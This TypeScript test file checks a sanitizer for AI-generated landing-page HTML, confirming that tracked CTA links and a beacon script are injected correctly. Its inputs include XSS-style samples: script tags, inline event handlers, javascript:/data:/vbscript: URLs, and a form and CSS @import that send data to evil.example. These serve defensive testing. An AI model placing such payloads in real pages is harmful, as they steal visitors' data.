import { test } from 'node:test'
import assert from 'node:assert/strict'
import {
  sanitizeLandingHtml,
  injectLandingRuntime,
  beaconScript,
  CTA_PLACEHOLDER,
  BEACON_PLACEHOLDER,
} from '../functions/_shared.ts'
import { inertLandingHtml, hasCtaPlaceholder } from '../src/lib/landingHtml.ts'

const FN_HOST = 'https://app.functions.insforge.app'

function doc(body: string): string {
  return `<!doctype html><html><head></head><body>${body}</body></html>`
}

test('sanitize strips <script> blocks the model emitted', () => {
  const html = doc(`<h1>Hi</h1><script>alert('x')</script><a href="${CTA_PLACEHOLDER}">Go</a>${BEACON_PLACEHOLDER}`)
  const clean = sanitizeLandingHtml(html)
  assert.ok(!/<script/i.test(clean))
  assert.ok(!clean.includes("alert("))
})

test('sanitize strips inline event handlers and javascript: urls', () => {
  const html = doc(`<a href="${CTA_PLACEHOLDER}" onclick="steal()">x</a><img src="javascript:bad()">${BEACON_PLACEHOLDER}`)
  const clean = sanitizeLandingHtml(html)
  assert.ok(!/onclick/i.test(clean))
  assert.ok(!/javascript:/i.test(clean))
})

test('sanitize neutralizes data:/vbscript: URLs and form actions', () => {
  const html = doc(
    `<a href="data:text/html,<script>alert(1)</script>">x</a>` +
      `<a href="vbscript:msgbox(1)">y</a>` +
      `<form action="https://evil.example/steal"><input name="email"></form>` +
      `<a href="${CTA_PLACEHOLDER}">go</a>${BEACON_PLACEHOLDER}`,
  )
  const clean = sanitizeLandingHtml(html)
  assert.ok(!/data:text\/html/i.test(clean), 'data: URL not neutralized')
  assert.ok(!/vbscript:/i.test(clean))
  // the real tracked CTA placeholder survives untouched
  assert.ok(clean.includes(CTA_PLACEHOLDER))
})

test('sanitize strips @import from inline <style> (CSS exfiltration vector)', () => {
  const html = doc(
    `<style>@import url("https://evil.example/x.css");body{color:red}</style>` +
      `<a href="${CTA_PLACEHOLDER}">x</a>${BEACON_PLACEHOLDER}`,
  )
  const clean = sanitizeLandingHtml(html)
  assert.ok(!/@import/i.test(clean), '@import not stripped')
  assert.ok(clean.includes('color:red'), 'legit CSS preserved')
})

test('sanitize injects a fallback CTA when the placeholder is missing', () => {
  const clean = sanitizeLandingHtml(doc('<h1>No cta here</h1>'))
  assert.ok(clean.includes(CTA_PLACEHOLDER), 'fallback CTA placeholder added')
})

test('sanitize guarantees a beacon slot', () => {
  const clean = sanitizeLandingHtml(doc(`<a href="${CTA_PLACEHOLDER}">x</a>`))
  assert.ok(clean.includes(BEACON_PLACEHOLDER))
})

test('inject replaces CTA placeholder with a tracked convert URL', () => {
  const clean = sanitizeLandingHtml(doc(`<a href="${CTA_PLACEHOLDER}">Buy</a>${BEACON_PLACEHOLDER}`))
  const live = injectLandingRuntime(clean, 'AbC123', 'scan-1', FN_HOST)
  assert.ok(live.includes(`${FN_HOST}/convert?code=AbC123`))
  assert.ok(!live.includes(CTA_PLACEHOLDER))
})

test('inject adds the real beacon when scanId present, nothing when null', () => {
  const clean = sanitizeLandingHtml(doc(`<a href="${CTA_PLACEHOLDER}">x</a>${BEACON_PLACEHOLDER}`))
  const withScan = injectLandingRuntime(clean, 'C', 'scan-9', FN_HOST)
  assert.ok(/<script>/.test(withScan))
  assert.ok(withScan.includes('scan-9'))
  assert.ok(withScan.includes('/scan-geo'))

  const noScan = injectLandingRuntime(clean, 'C', null, FN_HOST)
  assert.ok(!/<script>/.test(noScan), 'no script when scanId is null')
  assert.ok(!noScan.includes(BEACON_PLACEHOLDER))
})

test('code is URL-encoded in the injected CTA', () => {
  const clean = sanitizeLandingHtml(doc(`<a href="${CTA_PLACEHOLDER}">x</a>${BEACON_PLACEHOLDER}`))
  const live = injectLandingRuntime(clean, 'a b/c', 'scan', FN_HOST)
  assert.ok(live.includes('convert?code=a%20b%2Fc'))
})

test('beaconScript returns empty string for null scanId', () => {
  assert.equal(beaconScript(null, FN_HOST), '')
  assert.ok(beaconScript('s1', FN_HOST).includes('s1'))
})

test('SPA inert render neutralizes CTA and removes beacon (no real scan)', () => {
  const clean = sanitizeLandingHtml(doc(`<a href="${CTA_PLACEHOLDER}">x</a>${BEACON_PLACEHOLDER}`))
  const preview = inertLandingHtml(clean)
  assert.ok(!preview.includes(CTA_PLACEHOLDER))
  assert.ok(!preview.includes(BEACON_PLACEHOLDER))
  assert.ok(preview.includes('href="#"'))
  assert.ok(!/scan-geo/.test(preview))
})

test('hasCtaPlaceholder detects generated landings', () => {
  assert.equal(hasCtaPlaceholder(`<a href="${CTA_PLACEHOLDER}">x</a>`), true)
  assert.equal(hasCtaPlaceholder('<a href="#">x</a>'), false)
  assert.equal(hasCtaPlaceholder(null), false)
})

test('end-to-end: model output with a rogue script is safe after sanitize+inject', () => {
  const rogue = doc(
    `<h1 onmouseover="x()">T</h1><script>fetch('/steal')</script>` +
      `<a href="${CTA_PLACEHOLDER}">CTA</a>${BEACON_PLACEHOLDER}`,
  )
  const live = injectLandingRuntime(sanitizeLandingHtml(rogue), 'CODE', 'scan', FN_HOST)
  // Only our beacon script survives; the rogue script and handler are gone.
  assert.ok(!live.includes('/steal'))
  assert.ok(!/onmouseover/i.test(live))
  assert.equal((live.match(/<script>/g) || []).length, 1)
})
